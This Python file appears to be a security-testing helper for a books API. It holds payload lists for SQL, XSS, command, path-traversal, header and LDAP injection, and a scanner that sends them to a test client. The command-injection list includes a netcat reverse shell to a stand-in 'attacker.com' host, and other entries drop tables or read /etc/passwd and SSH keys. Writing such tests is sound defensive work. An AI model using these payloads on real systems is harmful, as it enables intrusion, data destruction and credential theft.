from typing import Dict, List
import json


SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE books; --",
    "admin' OR '1'='1' --",
    "1' UNION SELECT * FROM users--",
    "' OR 1=1--",
    "'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --",
    "1'; WAITFOR DELAY '00:00:05'--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<body onload=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//'"
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "&& dir",
    "|| echo vulnerable",
    "; nc -e /bin/sh attacker.com 4444"
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\windows\\system32",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "../../../../root/.ssh/id_rsa"
]

HEADER_INJECTION_PAYLOADS = [
    "test\r\nInjected-Header: value",
    "test\nX-Injected: true",
    "test\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK"
]

LDAP_INJECTION_PAYLOADS = [
    "*)(uid=*))(|(uid=*",
    "admin)(|(password=*",
    "*)(&(objectClass=*"
]


class SecurityScanner:
    def __init__(self, client, auth_headers=None):
        self.client = client
        self.auth_headers = auth_headers
        self.vulnerabilities = []
    
    def scan_sql_injection(self, endpoint: str, field: str) -> List[Dict]:
        results = []
        for payload in SQL_INJECTION_PAYLOADS:
            data = self._create_test_data(field, payload)
            result = self._test_payload(endpoint, data, "SQL Injection", payload)
            results.append(result)
            if result["vulnerable"]:
                self.vulnerabilities.append(result)
        return results
    
    def scan_xss(self, endpoint: str, field: str) -> List[Dict]:
        results = []
        for payload in XSS_PAYLOADS:
            data = self._create_test_data(field, payload)
            result = self._test_payload(endpoint, data, "XSS", payload)
            results.append(result)
            if result["vulnerable"]:
                self.vulnerabilities.append(result)
        return results
    
    def scan_command_injection(self, endpoint: str, field: str) -> List[Dict]:
        results = []
        for payload in COMMAND_INJECTION_PAYLOADS:
            data = self._create_test_data(field, payload)
            result = self._test_payload(endpoint, data, "Command Injection", payload)
            results.append(result)
            if result["vulnerable"]:
                self.vulnerabilities.append(result)
        return results
    
    def _create_test_data(self, field: str, value: str) -> Dict:
        return {
            "title": value if field == "title" else "Test Book",
            "author": value if field == "author" else "Test Author",
            "publication_year": 2020,
            "description": value if field == "description" else "Test description"
        }
    
    def _test_payload(self, endpoint: str, data: Dict, attack_type: str, payload: str) -> Dict:
        try:
            response = self.client.post(endpoint, json=data, headers=self.auth_headers)
            
            vulnerable = False
            if response.status_code == 201:
                response_data = response.json()
                if "book" in response_data:
                    for field, value in data.items():
                        if field in response_data["book"] and value in str(response_data["book"][field]):
                            vulnerable = True
            
            return {
                "attack_type": attack_type,
                "payload": payload,
                "status_code": response.status_code,
                "vulnerable": vulnerable,
                "sanitized": response.status_code == 422 or not vulnerable
            }
        except Exception as e:
            return {
                "attack_type": attack_type,
                "payload": payload,
                "error": str(e),
                "vulnerable": False,
                "sanitized": True
            }
    
    def get_report(self) -> Dict:
        return {
            "total_tests": len(self.vulnerabilities),
            "vulnerabilities_found": len([v for v in self.vulnerabilities if v["vulnerable"]]),
            "details": self.vulnerabilities
        }


def create_malformed_json_payloads() -> List[str]:
    return [
        '{"title": "Test"',
        '{"title": "Test", "author": }',
        '{title: "Test", author: "Author"}',
        '{"title": "Test", "author": "Author",}',
        '{"title": null, "author": null}',
        '[]',
        'null',
        '{"title": {"nested": "object"}}',
        '{"title": ["array", "values"]}'
    ]


def create_oversized_payload(multiplier: int = 1000) -> Dict:
    return {
        "title": "A" * (200 * multiplier),
        "author": "B" * (100 * multiplier),
        "publication_year": 2020,
        "description": "C" * (1000 * multiplier)
    }


def create_malformed_headers() -> List[Dict]:
    return [
        {"Content-Type": "application/xml"},
        {"Content-Type": "text/plain"},
        {"Content-Type": "application/json; charset=utf-16"},
        {"Content-Type": "multipart/form-data"},
        {"Accept": "text/html"},
        {"X-Custom-Header": "A" * 10000}
    ]


def test_integer_overflow_values() -> List[int]:
    return [
        2147483647,
        2147483648,
        -2147483648,
        -2147483649,
        999999999999999,
        -999999999999999
    ]


def create_unicode_attack_strings() -> List[str]:
    return [
        "\u0000",
        "\uffff",
        "\U0001f600" * 100,
        "\u202e\u202d",
        "\ufeff" * 1000,
        "A" * 50 + "\u0000" + "B" * 50
    ]

